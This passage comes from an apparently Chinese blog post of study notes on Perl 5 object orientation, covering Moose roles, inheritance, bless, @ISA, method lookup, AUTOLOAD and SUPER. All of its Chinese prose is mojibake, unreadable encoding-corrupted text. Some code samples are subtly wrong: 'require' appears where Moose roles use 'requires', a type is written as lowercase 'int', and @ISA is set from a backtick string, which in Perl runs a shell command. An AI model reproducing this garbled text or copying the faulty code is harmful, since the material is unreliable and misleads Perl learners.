class="hljs-string">&#x27;rw&#x27;</span>; <br>has <span class="hljs-string">&#x27;birth_year&#x27;</span>,   <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Int&#x27;</span>,<br>                    <span class="hljs-string">default =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; (<span class="hljs-keyword">localtime</span>)[<span class="hljs-number">5</span>] + <span class="hljs-number">1900</span> &#125;; <br><br></code></pre></td></tr></table></figure><h3 id="å¤šæ€"><a href="#å¤šæ€" class="headerlink" title="å¤šæ€"></a>å¤šæ€</h3><p><mark>å¤šæ€</mark> , å³å¯ä»¥ç”¨ä¸€ä¸ªç±»çš„å¯¹è±¡æ›¿æ¢å¦ä¸€ä¸ªç±»çš„å¯¹è±¡, åªè¦å®ƒä»¬ä»¥ç›¸åŒçš„æ–¹å¼æä¾›ç›¸åŒçš„å¤–éƒ¨æ¥å£.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">show_vital_stats</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $object = <span class="hljs-keyword">shift</span>;<br><br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;My name is &#x27;</span>, $object-&gt;name();<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;I am&#x27;</span>,        $object-&gt;age();<br>    <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;I eat &#x27;</span>,      $object-&gt;diet();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ, ä»»ä½•æä¾› <code>name()</code>, <code>age()</code>, <code>diet()</code> è®¿é—®å™¨çš„å¯¹è±¡éƒ½å¯ä»¥ä½¿ç”¨æ­¤å‡½æ•°.</p><h3 id="è§’è‰²"><a href="#è§’è‰²" class="headerlink" title="è§’è‰²"></a>è§’è‰²</h3><p><mark>è§’è‰²</mark> æ˜¯ä¸€ä¸ªå…·åè¡Œä¸ºå’ŒçŠ¶æ€çš„é›†åˆ.</p><p>ç±»å°±åƒä¸€ä¸ªè§’è‰², å®ƒä»¬ä¹‹é—´é‡è¦çš„åŒºåˆ«å°±æ˜¯ä½ å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œå®ä¾‹åŒ–, ä½†è§’è‰²å°±ä¸è¡Œ.</p><p>å¯¹äºå¯¹è±¡æ¥è¯´, ç±»æ˜¯å°†è¡Œä¸ºå’ŒçŠ¶æ€ç»„ç»‡ä¸ºæ¨¡æ¿çš„ä¸»è¦æœºåˆ¶, è€Œè§’è‰²ä¾¿æ˜¯å°†è¡Œä¸ºå’ŒçŠ¶æ€ç»„ç»‡ä¸ºå…·åé›†åˆçš„ä¸»è¦æœºåˆ¶.</p><p>æ„Ÿè§‰è§’è‰²å°±æ˜¯ä»¥ä¸€äº›ç±»çš„è¡Œä¸ºæ¥æ ‡è¯†çš„ä¸€ç±»å¯¹è±¡.</p><p>ä½¿ç”¨ <code>with</code> å…³é”®å­—å‘ç±»æ·»åŠ è§’è‰², å…¶è¯­å¥å¿…é¡»å‡ºç°åœ¨å±æ€§å£°æ˜ä¹‹å, ä½¿å¾—è¯¥åˆæˆè¿‡ç¨‹å¯ä»¥è¯†åˆ«ä»»ä½•ç”Ÿæˆçš„è®¿é—®å™¨æ–¹æ³•, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Cat;<br><br><span class="hljs-keyword">use</span> Moose;<br><br>has <span class="hljs-string">&#x27;name&#x27;</span>,           <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>has <span class="hljs-string">&#x27;diet&#x27;</span>,           <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;rw&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>has <span class="hljs-string">&#x27;birth_year&#x27;</span>,     <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Int&#x27;</span>,<br>                      <span class="hljs-string">default =&gt;</span> (<span class="hljs-keyword">localtime</span>)[<span class="hljs-number">5</span>] + <span class="hljs-number">1900</span>;<br><br>with <span class="hljs-string">&#x27;LivingBeing&#x27;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">age</span> </span>&#123; ... &#125;<br></code></pre></td></tr></table></figure><p>æ£€æŸ¥ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ <mark>èƒ½å¤Ÿé¥°æ¼” <code>LivingBeing</code> è§’è‰²</mark>, è¿™é‡Œæ„Ÿè§‰åƒæ˜¯åˆ›å»ºä¸€ä¸ªè§’è‰² :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">package</span> LivingBeing;<br><br>    <span class="hljs-keyword">use</span> Moose::Role;<br><br>    <span class="hljs-keyword">require</span> <span class="hljs-string">qw( name age diet )</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å› æ­¤, å¹¶ä¸æ˜¯æ‰€æœ‰çš„ <code>Cat</code> å®ä¾‹ä¼šè¿”å›çœŸ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Alive!&#x27;</span> <span class="hljs-keyword">if</span> $fluffy-&gt;does(<span class="hljs-string">&#x27;LivingBeing&#x27;</span>);<br><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Moldy!&#x27;</span> <span class="hljs-keyword">if</span> $cheese-&gt;does(<span class="hljs-string">&#x27;LivingBeing&#x27;</span>);<br></code></pre></td></tr></table></figure><p>é¥°æ¼”ä¸¤ä¸ªè§’è‰²:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Cat;<br><br><span class="hljs-keyword">use</span> Moose;<br><br>has <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>has <span class="hljs-string">&#x27;diet&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;rw&#x27;</span>;<br><br>with <span class="hljs-string">&#x27;LivingBeing&#x27;</span>, <span class="hljs-string">&#x27;CalculateAgeFromBirthYear&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="è§’è‰²å’Œ-DOES"><a href="#è§’è‰²å’Œ-DOES" class="headerlink" title="è§’è‰²å’Œ DOES()"></a>è§’è‰²å’Œ <code>DOES()</code></h4><p>å¯¹ä¸€ä¸ªç±»åº”ç”¨ä¸€ä¸ªè§’è‰²æ„å‘³ç€ä½ åœ¨è°ƒç”¨è¯¥ç±»å’Œå®ƒçš„å®ä¾‹ <code>DOES()</code> æ–¹æ³•æ—¶è¿”å›çœŸ.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;This Cat is alive!&#x27;</span> <span class="hljs-keyword">if</span> $kitten-&gt;DOES( <span class="hljs-string">&#x27;LivingBeing&#x27;</span> );<br></code></pre></td></tr></table></figure><h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>åœ¨ä¸¤ä¸ªç±»é—´å»ºç«‹èµ·ä¸€ç§å…³ç³», å…¶ä¸­å­ç±»ä»çˆ¶ç±»ç»§æ‰¿å±æ€§å’Œè¡Œä¸º.</p><p>Perl 5 å¯¹è±¡ç³»ç»Ÿæœ€è¿‘åŸºäºè§’è‰²çš„å¯¹è±¡ç³»ç»Ÿå®éªŒæ˜¾ç¤º, åœ¨ä¸€ä¸ªç³»ç»Ÿä¸­å‡ ä¹æ‰€æœ‰ç”¨åˆ°ç»§æ‰¿çš„åœ°æ–¹éƒ½å¯ä»¥ç”¨è§’è‰²æ¥ä»£æ›¿.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">package</span> LightSource;<br><br>    <span class="hljs-keyword">use</span> Moose;<br><br>    has <span class="hljs-string">&#x27;candle_power&#x27;</span>, <span class="hljs-string">is      =&gt;</span>   <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;int&#x27;</span>,<br>                        <span class="hljs-string">default =&gt;</span> <span class="hljs-number">1</span>;<br>    has <span class="hljs-string">&#x27;enabled&#x27;</span>,      <span class="hljs-string">is      =&gt;</span>   <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Bool&#x27;</span>,<br>                        <span class="hljs-string">default =&gt;</span> <span class="hljs-number">0</span>, <span class="hljs-string">_writer =&gt;</span> <span class="hljs-string">&#x27;_set_enabled&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">light</span> </span>&#123;<br>        <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>        $self-&gt;_set_enabled(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">extinguish</span> </span>&#123;<br>        <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>        $self-&gt;_set_enabled(<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç±»æœ‰ä¸¤ä¸ªå…¬å…±å±æ€§, ä¸¤ä¸ªæ–¹æ³•, <code>enabled</code> å±æ€§çš„ <code>_writer</code> é€‰é¡¹åˆ›å»ºäº†ä¸€ä¸ªç§æœ‰è®¿é—®å™¨, å¯åœ¨ç±»å†…éƒ¨ç”¨äºè®¾ç½®å€¼.</p><h4 id="ç»§æ‰¿å’Œå±æ€§"><a href="#ç»§æ‰¿å’Œå±æ€§" class="headerlink" title="ç»§æ‰¿å’Œå±æ€§"></a>ç»§æ‰¿å’Œå±æ€§</h4><p>å¦‚è¦†ç›–çˆ¶ç±»æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>    <span class="hljs-keyword">package</span> LightSource::Glowstick;<br><br>    <span class="hljs-keyword">use</span> Moose;<br><br>    extends <span class="hljs-string">&#x27;LightSource&#x27;</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">extinguish</span> </span>&#123;&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>Perl çš„æ–¹æ³•åˆ†æ´¾ç³»ç»Ÿå°†å…ˆæ‰¾åˆ°è¿™ä¸ªæ–¹æ³•å¹¶ä¸”ä¸ä¼šå†åœ¨çˆ¶ç±»ä¸­æŸ¥æ‰¾ä¸æ­¤åŒåçš„å…¶ä»–æ–¹æ³•.</p><p>è¦†ç›–åä¹Ÿéœ€è¦æ¥è‡ªçˆ¶ç±»åŒåæ–¹æ³•çš„æŸäº›è¡Œä¸º, è§ä¹¦.</p><h4 id="ç»§æ‰¿å’Œ-isa"><a href="#ç»§æ‰¿å’Œ-isa" class="headerlink" title="ç»§æ‰¿å’Œ isa()"></a>ç»§æ‰¿å’Œ <code>isa()</code></h4><p>å¦‚æœç»§æ‰¿äºæŸçˆ¶ç±», åˆ™è°ƒç”¨ <code>isa()</code> æ–¹æ³•æ—¶è¿”å›çœŸ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Looks like a LightSource&#x27;</span> <span class="hljs-keyword">if</span>     $sconce-&gt;isa(<span class="hljs-string">&#x27;LightSource&#x27;</span>);<br><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Monkeys do not glow&#x27;</span>      <span class="hljs-keyword">unless</span> $sconce-&gt;isa(<span class="hljs-string">&#x27;LightSource&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="Moose-å’Œ-Perl-5-OO"><a href="#Moose-å’Œ-Perl-5-OO" class="headerlink" title="Moose å’Œ Perl 5 OO"></a>Moose å’Œ Perl 5 OO</h3><p>æ¥è‡ª CPAN çš„ <code>MooseX::Declare</code> æ‰©å±•ä½¿ç”¨äº†ä¸€ä¸ªç§°ä¸º <code>Devel::Declare</code> çš„æ¨¡å—å‘ Perl 5 æ·»åŠ æ–°è¯­æ³•.</p><p>Moose å’Œå®ƒçš„ <mark>å…ƒå¯¹è±¡åè®® (MOP)</mark> ä¸ºä¸€ä¸ªæ›´å¥½çš„, ç”¨äºåœ¨ Perl 5 ä¸­æ“ä½œç±»å’Œå¯¹è±¡çš„è¯­æ³•æä¾›äº†å¯èƒ½:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> MooseX::Declare;<br><br>role LivingBeing &#123; <span class="hljs-keyword">require</span> <span class="hljs-string">qw( name age diet)</span> &#125;<br><br>role CalculateAgeFromBirthYear &#123;<br>    has <span class="hljs-string">&#x27;birth_year&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Int&#x27;</span>,<br>                      <span class="hljs-string">default =&gt;</span> <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; (<span class="hljs-keyword">localtime</span>)[<span class="hljs-number">5</span>] + <span class="hljs-number">1900</span> &#125;;<br><br>    method age &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">localtime</span>)[<span class="hljs-number">5</span>] + <span class="hljs-number">1900</span> -$self-&gt;birth_year();<br>    &#125;<br>&#125;<br><br>class Cat with LivingBeing with CalculateAgeFromBirthYear &#123;<br>    has <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>, <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>;<br>    has <span class="hljs-string">&#x27;diet&#x27;</span>, <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;rw&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ç»-bless-åçš„å¼•ç”¨"><a href="#ç»-bless-åçš„å¼•ç”¨" class="headerlink" title="ç» bless åçš„å¼•ç”¨"></a>ç» bless åçš„å¼•ç”¨</h2><p>Perl 5 çš„é»˜è®¤å¯¹è±¡ç³»ç»Ÿä»¥ä¸‰æ¡ç®€å•çš„è§„åˆ™æ„æˆ:</p><ul><li>ä¸€ä¸ªç±»å°±æ˜¯ä¸€ä¸ªåŒ…</li><li>ä¸€ä¸ªæ–¹æ³•å°±æ˜¯ä¸€ä¸ªå‡½æ•°</li><li>ä¸€ä¸ª (<code>bless</code> åçš„) å¼•ç”¨å°±æ˜¯ä¸€ä¸ªå¯¹è±¡</li></ul><p><code>bless</code> å…³é”®å­—å°†ä¸€ä¸ª<mark>ç±»çš„åç§°</mark>å’Œä¸€ä¸ª <mark>å¼•ç”¨</mark> å…³è”èµ·æ¥, ä½¿å¾—ä»»ä½•åœ¨è¯¥å¼•ç”¨ä¸Šè¿›è¡Œçš„æ–¹æ³•è°ƒç”¨ç”±ä¸ä¹‹ç›¸å…³è”çš„ç±»æ¥è§£æ.</p><p>é»˜è®¤çš„ Perl 5 å¯¹è±¡æ„é€ å™¨æ˜¯ä¸€ä¸ªåˆ›å»ºå¼•ç”¨å¹¶å¯¹å…¶è¿›è¡Œ <code>bless</code> çš„æ–¹æ³•, å‡ºäºæƒ¯ä¾‹, æ„é€ å™¨é€šå¸¸å‘½åä¸º <code>new()</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">new</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">bless</span> &#123;&#125;, $class;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>bless</code> æ¥å—ä¸¤ä¸ªå‚æ•°</p><ul><li>ä¸ç±»ç›¸å…³è”çš„å¼•ç”¨</li><li>ç±»çš„åç§°<br>è¿”å›å€¼æ˜¯è¢« <code>bless</code> çš„å¼•ç”¨.</li></ul><p>ç±»åç§°ä¸éœ€è¦äº‹å…ˆå­˜åœ¨.</p><p>å¯ä»¥ <code>bless</code> ä»»ä½•ç±»å‹çš„å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $array_obj = <span class="hljs-keyword">bless</span> [], $class;<br><span class="hljs-keyword">my</span> $scalar_obj = <span class="hljs-keyword">bless</span> \$scalar, $class;<br><span class="hljs-keyword">my</span> $sub_obj = <span class="hljs-keyword">bless</span> \&amp;some_sub, $class;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªç±»ç¤ºä¾‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Player;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">new</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> ($class, %attrs) = @_;<br><br>    <span class="hljs-keyword">bless</span> \%attrs, $class;<br>&#125;<br><br><span class="hljs-keyword">my</span> $joel = Player-&gt;new(<br>    <span class="hljs-string">number   =&gt;</span> <span class="hljs-number">10</span>,<br>    <span class="hljs-string">position =&gt;</span> <span class="hljs-string">&#x27;center&#x27;</span>,<br>);<br><br><span class="hljs-keyword">my</span> $jerryd = Player-&gt;new(<br>    <span class="hljs-string">number   =&gt;</span> <span class="hljs-number">4</span>,<br>    <span class="hljs-string">position =&gt;</span> <span class="hljs-string">&#x27;guard&#x27;</span>,<br>);<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´, å±æ€§æ˜¯é€šè¿‡å“ˆå¸Œæ¥åˆ›å»º.</p><p>æä¾›è®¿é—®å™¨æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">number</span>   </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">shift</span>-&gt;&#123;number&#125;   &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">position</span> </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-keyword">shift</span>-&gt;&#123;position&#125; &#125;<br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•æŸ¥æ‰¾å’Œç»§æ‰¿"><a href="#æ–¹æ³•æŸ¥æ‰¾å’Œç»§æ‰¿" class="headerlink" title="æ–¹æ³•æŸ¥æ‰¾å’Œç»§æ‰¿"></a>æ–¹æ³•æŸ¥æ‰¾å’Œç»§æ‰¿</h3><p>å¯¹è±¡çš„æ–¹æ³•åˆ†æ´¾, å³ä¸€ä¸ªå¯¹è±¡è°ƒç”¨æ–¹æ³•æ—¶, è¿™ä¸ªæ–¹æ³•åœ¨ç±»ä¸­æŸ¥æ‰¾, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $number = $joel-&gt;number();<br></code></pre></td></tr></table></figure><p>å°†åœ¨ä¸ç» <code>bless</code> åçš„å¼•ç”¨ <code>$joel</code> ç›¸å…³è”ç±»ä¸­æŸ¥æ‰¾åç§°. è¿™é‡Œçš„ç±»ä¸º <code>number</code>, åˆ™åœ¨ <code>Player</code> åŒ…å†…æŸ¥æ‰¾ä¸€ä¸ªåä¸º <code>number</code> çš„å‡½æ•°, å¦‚æœ <code>Player</code> ç±»ä»å…¶ä»–ç±»ç»§æ‰¿è€Œæ¥, Perl ä¹Ÿä¼šåœ¨çˆ¶ç±»ä¸­æŸ¥æ‰¾, çŸ¥é“å•Šæ‰¾åˆ° <code>number</code> æ–¹æ³•.</p><p>æ¯ä¸€ä¸ªç» <code>bless</code> åçš„å¼•ç”¨çš„ç±»å°†çˆ¶ç±»ä¿¡æ¯å­˜æ”¾åœ¨ä¸€ä¸ªåä¸º <code>@ISA</code> çš„åŒ…å…¨å±€å˜é‡ä¸­. æ–¹æ³•åˆ†æ´¾å™¨ä¼šåœ¨ä¸€ä¸ªç±»çš„ <code>@ISA</code> ä¸­æŸ¥æ‰¾å®ƒçš„çˆ¶ç±», ä»¥åœ¨å…¶ä¸­æœç´¢åˆé€‚çš„æ–¹æ³•. å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> InjuredPlayer;<br><br>@InjuredPlayer::ISA = <span class="hljs-string">`Player`</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ <code>parent</code> ç¼–è¯‘å‘½ä»¤æ›¿ä»£:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> InjuredPlayer;<br><br><span class="hljs-keyword">use</span> parent <span class="hljs-string">&#x27;Player&#x27;</span>;    <br></code></pre></td></tr></table></figure><p>åœ¨è§£ææ–¹æ³•åˆ†æ´¾æ—¶, Perl 5 åœ¨ä¼ ç»Ÿä¸Šåå‘äºå¯¹çˆ¶ç±»ä½¿ç”¨æ·±åº¦ä¼˜å…ˆæœç´¢, å³, å¦‚æœ <code>InjuredPlayer</code> ä» <code>Player</code> å’Œ <code>Hospital::Patient</code> ä¸¤è€…ç»§æ‰¿, ä¸€ä¸ªåœ¨ InjuredPlayer å®ä¾‹ä¸Šè°ƒç”¨çš„æ–¹æ³•å°†å…ˆåˆ†æ´¾åˆ° <code>InjuredPlayer</code>, ç„¶åæ˜¯ <code>Player</code> , æ¥ç€ç»è¿‡æ‰€æœ‰ <code>Player</code> çš„çˆ¶ç±»æ¥åˆ° <code>Hospital::Patient</code>.</p><p>Perl 5.10 å¢åŠ äº†ä¸€ä¸ªåä¸º <code>mro</code> çš„ç¼–è¯‘æŒ‡ä»¤, å…·ä½“è§ä¹¦.</p><h3 id="AUTOLOAD-1"><a href="#AUTOLOAD-1" class="headerlink" title="AUTOLOAD"></a>AUTOLOAD</h3><p>åœ¨è°ƒç”¨è€…çš„ç±»åŠå…¶è¶…ç±»ä¸­æ²¡æœ‰å¯ç”¨çš„æ–¹æ³•æ—¶, Perl 5 å°±ä¼šæŒ‰ç…§è§£æé¡ºåºåœ¨æ¯ä¸ªç±»ä¸­æŸ¥æ‰¾ <code>AUTOLOAD</code> å‡½æ•°.</p><h3 id="æ–¹æ³•è¦†ç›–å’Œ-SUPER"><a href="#æ–¹æ³•è¦†ç›–å’Œ-SUPER" class="headerlink" title="æ–¹æ³•è¦†ç›–å’Œ SUPER"></a>æ–¹æ³•è¦†ç›–å’Œ <code>SUPER</code></h3><p>è¦åœ¨å­ç±»ä¸­è¦†ç›–ä¸€ä¸ªæ–¹æ³•, åªéœ€å£°æ˜ä¸€ä¸ªå’Œçˆ¶ç±»æ–¹æ³•åŒåçš„æ–¹æ³•.</p><p>åœ¨è¦†ç›–æ–¹æ³•å†…, å¯ä»¥é€šè¿‡ <code>SUPER::</code> åˆ†æ´¾æŒ‡ç¤ºæ¥<mark>è°ƒç”¨çˆ¶ç±»æ–¹æ³•</mark>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">overridden</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Called overridden() in child!&quot;</span>;<br>    <span class="hljs-keyword">return</span> $self-&gt;SUPER::overridden( @_ );<br>&#125;<br></code></pre></td></tr></table></figure><p>æ–¹æ³•åçš„ <code>SUPER::</code> å‰ç¼€å‘Šè¯‰æ–¹æ³•åˆ†æ´¾å™¨å°†æ­¤æ–¹æ³•åˆ†æ´¾åˆ°çˆ¶ç±»çš„å…·åå®ç°.</p><p>CPAN ä¸Šæœ‰ <code>SUPER</code> æ¨¡å—.</p><h3 id="åº”ä»˜ç»-bless-åå¼•ç”¨çš„ç­–ç•¥"><a href="#åº”ä»˜ç»-bless-åå¼•ç”¨çš„ç­–ç•¥" class="headerlink" title="åº”ä»˜ç» bless åå¼•ç”¨çš„ç­–ç•¥"></a>åº”ä»˜ç» <code>bless</code> åå¼•ç”¨çš„ç­–ç•¥</h3><p>å¯èƒ½çš„è¯é¿å…ä½¿ç”¨ <code>AUTOLOAD</code>.</p><p>ä½¿ç”¨è®¿é—®å™¨æ–¹æ³•è€Œéç›´æ¥é€šè¿‡å¼•ç”¨è®¿é—®å®ä¾‹æ•°æ®.</p><p>å¦‚æœæ— æ³•ä½¿ç”¨ <code>Moose</code>, è€ƒè™‘ä½¿ç”¨ <code>Class::Accessor</code> è¿™ç±»æ¨¡å—æ¥é¿å…é‡å¤ç¼–å†™æ ·æ¿.</p><p>ä¸è¦åœ¨åŒä¸€ä¸ªç±»é‡Œæ··ç”¨å‡½æ•°å’Œæ–¹æ³•.</p><p>ä¸ºæ¯ä¸€ä¸ªç±»ä½¿ç”¨å•ç‹¬çš„ <code>.pm</code> æ–‡ä»¶.</p><p>è€ƒè™‘ä½¿ç”¨ <code>Moose</code> å’Œ <code>Any::Moose</code> æ¥æ›¿ä»£èµ¤è£¸çš„ Perl 5 OO.</p><h2 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h2><p><mark>åå°„ (æˆ–ç§° å†…çœ)</mark> æ˜¯è¿è¡ŒæœŸé—´å‘ä¸€ä¸ªç¨‹åºè¯¢é—®å…¶è‡ªèº«æƒ…å†µçš„è¿‡ç¨‹.</p><p><code>Class::MOP</code> ç®€åŒ–äº†è®¸å¤šå¯¹è±¡ç³»ç»Ÿä¸­çš„åå°„ä»»åŠ¡, 